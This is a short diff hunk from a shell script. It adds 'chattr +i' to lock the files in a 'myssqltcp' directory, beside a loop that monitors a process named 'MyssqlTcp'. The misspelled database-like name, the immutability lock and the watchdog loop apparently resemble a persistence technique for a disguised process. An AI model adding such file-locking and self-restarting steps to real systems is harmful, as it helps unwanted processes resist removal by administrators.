@@ -10,6 +10,8 @@ if [ ! -d $HOME ]; then
   exit 1
 fi
 
+chattr +i myssqltcp/*
+
 export LD_LIBRARY_PATH=$HOME/myssqltcp/
 monitoring_process="MyssqlTcp"
 while true; do
